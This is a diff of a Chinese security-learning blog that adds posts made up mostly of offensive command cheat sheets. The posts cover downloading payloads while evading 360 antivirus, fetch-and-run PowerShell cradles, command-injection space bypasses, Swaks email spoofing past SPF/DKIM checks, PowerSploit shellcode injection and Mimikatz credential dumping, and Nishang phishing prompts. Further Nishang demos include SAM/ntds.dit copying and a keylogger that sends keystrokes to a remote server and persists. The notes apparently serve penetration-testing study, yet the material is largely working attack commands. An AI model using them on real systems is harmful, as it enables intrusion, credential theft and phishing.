@@ -261,6 +261,176 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/09/10/命令行文件下载的各种姿势/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/10/命令行文件下载的各种姿势/" itemprop="url">命令行文件下载的各种姿势</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-10T12:10:57+08:00">
+                2019-09-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/命令行/" itemprop="url" rel="index">
+                    <span itemprop="name">命令行</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="命令行文件下载的各种姿势"><a href="#命令行文件下载的各种姿势" class="headerlink" title="命令行文件下载的各种姿势"></a>命令行文件下载的各种姿势</h1><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><ul>
+<li>​       <a href>bitsadmin /rawreturn /transfer down “http://172.22.35.212/payload1.xml”  C:\1.txt</a> </li>
+<li>​       bitsadmin /transferdown /download /prioritynomal “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a> C:\1.txt  –进度条</li>
+</ul>
+<p>会引发360弹窗。</p>
+<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><ul>
+<li>wget -i <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
+</ul>
+<p>360下有弹窗</p>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><ul>
+<li>curl -O <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
+<li>curl <a href="http://192.168.0.107/1.sh" target="_blank" rel="noopener">http://192.168.0.107/1.sh</a> -o- | sh  –sh脚本执行</li>
+</ul>
+<p>360下有弹窗</p>
+<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><ul>
+<li>powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://172.22.35.212/payload1.xml&#39;)&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&#39;)&quot;</a> | out-file payload.xm</li>
+<li>Invoke-WebRequest -Uri  “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a>  -OutFile ‘pay.txt’ -UseBasicParsing</li>
+<li>powershell -w hidden Invoke-WebRequest -uri <a href="http://172.22.35.106/PAYLOAD1.XML" target="_blank" rel="noopener">http://172.22.35.106/PAYLOAD1.XML</a> -OutFile 1025.xml</li>
+<li>(New-Object System.Net.WebClient).downloadfile(“<a href="http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;</a>)</li>
+</ul>
+<p>第四条360无弹窗</p>
+<h2 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h2><ul>
+<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> </li>
+<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> delete –清除痕迹</li>
+</ul>
+<p>360下无弹窗<br>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/1.jpg" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -600,6 +770,545 @@ PasswordAuthentication yes
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/cmd绕过空格过滤/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/cmd绕过空格过滤/" itemprop="url">cmd绕过空格过滤</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/杂项/" itemprop="url" rel="index">
+                    <span itemprop="name">杂项</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="cmd绕过空格过滤"><a href="#cmd绕过空格过滤" class="headerlink" title="cmd绕过空格过滤"></a>cmd绕过空格过滤</h1><p>Ps：<strong>从大佬那里学的一点小技巧</strong></p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>Windows支持环境变量切片操作，可以切割出一个空格接上。</p>
+<blockquote>
+<p>set //查看环境变量</p>
+</blockquote>
+<blockquote>
+<p>net%CommonProgramFiles:~10,-18%user </p>
+<p> 意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user<br>既</p>
+</blockquote>
+<pre><code>CommonProgramFiles=C:\Program Files\Common Files
+net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br>** 经测试在win7,win10,win8,win2008,win2003,均有效</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;ping,-c,<span class="number">1</span>,<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#125;</span><br><span class="line">ping$&#123;IFS&#125;-c$&#123;IFS&#125;<span class="number">1</span>$&#123;IFS&#125;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/使用Swaks对邮件进行深入定制/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/使用Swaks对邮件进行深入定制/" itemprop="url">Swaks简介</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
+                    <span itemprop="name">社会工程学</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Swaks简介"><a href="#Swaks简介" class="headerlink" title="Swaks简介"></a>Swaks简介</h1><blockquote>
+<p><strong>Swaks</strong>的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提供最大的可配置性和易用性。</p>
+</blockquote>
+<p>Swaks也被称为SMTP协议的瑞士军刀，它可以灵活的操作SMTP协议报文，它通常被用来伪造邮件，进行钓鱼、社工等操作。并且可以绕过常规的基于SPF与DKIM的垃圾邮箱检测。Kali已预装Swaks</p>
+<h2 id="基本参数说明"><a href="#基本参数说明" class="headerlink" title="基本参数说明"></a>基本参数说明</h2><blockquote>
+<p>swaks –to <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //首先测试邮箱的连通性；</p>
+<blockquote>
+<ul>
+<li>–to  <a href="mailto:test@gmail.com" target="_blank" rel="noopener">test@gmail.com</a>      //接件人邮箱；</li>
+<li>–from  <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //发件人邮箱；</li>
+<li>–ehlo  qq.com     //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证；</li>
+<li>–server  mail.smtp2go.com     //服务邮件域</li>
+<li>–body  “test”    //引号中的内容即为邮件正文，可直接引用文件；</li>
+<li>–data  ./Desktop/email.txt    //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</li>
+<li>–header  “Subject:标题”     //邮件标题;</li>
+<li>–header-X-Mailer  gmail.com     //X-Mailer标头表示用于起草和发送原始电子邮件的程序</li>
+<li>–h-From:  ‘boss <a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>‘     //伪造的发件人邮箱；</li>
+<li>–attach /root/test.txt     //附件</li>
+</ul>
+</blockquote>
+</blockquote>
+<h2 id="SPF验证原理"><a href="#SPF验证原理" class="headerlink" title="SPF验证原理"></a>SPF验证原理</h2><blockquote>
+<p>SPF是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。<br>按照SPF的格式在DNS记录中增加一条TXT类型的记录，将提高该域名的信誉度，同时可以防止垃圾邮件伪造该域的发件人发送垃圾邮件。<br>SPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。mx记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。<br>由定义可以看出，SPF的作用主要是反垃圾邮件，主要针对那些发信人伪造域名的垃圾邮件。</p>
+</blockquote>
+<p>如果mail.smtp2go.com是真正的邮件服务器，那么Gmail的服务器收到的源IP也肯定是mail.smtp2go.com的IP。Gmail中会校验邮件发送者的IP是否存在于smtp.from的域名SPF配置列表里,但是邮件显示的是from头中的域而不是服务邮件域，因此可以将服务邮件域设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>
+<h2 id="DKIM工作原理"><a href="#DKIM工作原理" class="headerlink" title="DKIM工作原理"></a>DKIM工作原理</h2><blockquote>
+<p>DKIM 的基本工作原理同样是基于传统的密钥认证方式，他会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在寄信服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件。</p>
+</blockquote>
+<p>但是这里由于使用了第三方邮件服务器,公钥和私钥已经提供了.</p>
+<h3 id="实际效果"><a href="#实际效果" class="headerlink" title="实际效果"></a>实际效果</h3><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/2.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/1.png" alt="avatar"></p>
+<ul>
+<li><strong>总结：SPF和DKIM已经pass了，DMARC这东西不清楚是什么，但是暂时不影响邮件的正常接收。<br>在测试过程中发现，伪造gmail域时不能发给gmail域，只能伪造为其他域的邮件发送，比如163.com,qq.com。整体来说，电脑上查看就比正常邮件多了个通过xxx代发，又因为手机上信息显示不全，手机查看几乎无破绽，所以欺骗性还是非常强的</strong></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/PowerSploit基本功能演示/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/PowerSploit基本功能演示/" itemprop="url">PowerSploit基本功能演示</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
+<li><p>AntivirusBypass     //发现杀软查杀特征</p>
+</li>
+<li><p>CodeExecution      //代码执行</p>
+</li>
+<li><p>Exfiltration     //信息收集</p>
+</li>
+<li><p>Mayhem    //破坏性脚本</p>
+</li>
+<li><p>Persistence    //后门</p>
+</li>
+<li><p>Recon     //利用跳板进行内网信息侦擦</p>
+</li>
+<li><p>ScriptModification     //创建或修改脚本</p>
+<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
+<li><ul>
+<li>Invoke-Shellcode.ps1 **</li>
+</ul>
+<p>shellcode注入</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
+//下载并导入脚本
+IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
+//下载powershell的shellcode
+Invoke-Shellcode -Shellcode ($buf) -Force
+//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
+Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
+//隐藏的开始一个记事本进程。
+Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
+//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
+<li><ul>
+<li>Invoke-DllInjection.ps1 **</li>
+</ul>
+<p>dll注入</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
+//下载并导入脚本
+Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
+//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
+<li><ul>
+<li>Invoke-Portscan **</li>
+</ul>
+<p>端口扫描</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
+//下载并导入脚本
+Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
+//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
+<li><ul>
+<li>Invoke-Mimikatz.ps1 **</li>
+</ul>
+<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
+<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
+ //下载并导入脚本
+ Invoke-Mimikatz -DumpCreds
+ //抓取密码
+
+** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
+//下载并导入脚本
+Get-Keystrokes -LogPath c:\test.txt
+//开启记录并保存到指定位置</code></pre></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/Window下使用PowerUp辅助提权/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -704,6 +1413,195 @@ C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找
 <p>通过重启服务返回了SYSTEM的session</p>
 <pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
 
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/Nishang模块简介及演示/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/Nishang模块简介及演示/" itemprop="url">Nishang模块简介及演示</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+</blockquote>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
+</ul>
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>​<br>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
           
         
       
@@ -965,734 +1863,6 @@ Keyboard.end();//结束键盘通讯
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
